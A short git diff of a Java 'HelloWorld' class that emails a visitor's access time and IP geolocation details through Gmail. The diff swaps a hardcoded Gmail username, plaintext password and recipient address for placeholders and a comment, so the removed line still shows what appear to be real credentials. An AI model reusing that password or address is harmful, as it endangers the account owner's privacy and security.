@@ -14,8 +14,15 @@ public class HelloWorld {
         msg += "Time/Date of access: " + new Time().lDateTime();
         msg += "\n\nFull Info:\n" + new Splitter().toStringS(new GeoLoc().sayGEO(ip));
 
-
+        /*
+        *From - here goes the string of your gmail inbox, add it without @gmail.com
+        *Password - your password as a string
+        *To - recipient's email, this time with @gmail.com
+        *CC - Who needs this anyways
+        *Title - title of your email
+        *Message - content of the email
+        */
         GoogleMail mailG = new GoogleMail();
-        mailG.Send("Sacrabear", "Ivan27051999v!", "Ivanvarenytsia@gmail.com", "", "Hello World", msg);
+        mailG.Send("From", "Password", "To", "CC", "Title", "Message");
     }
 }
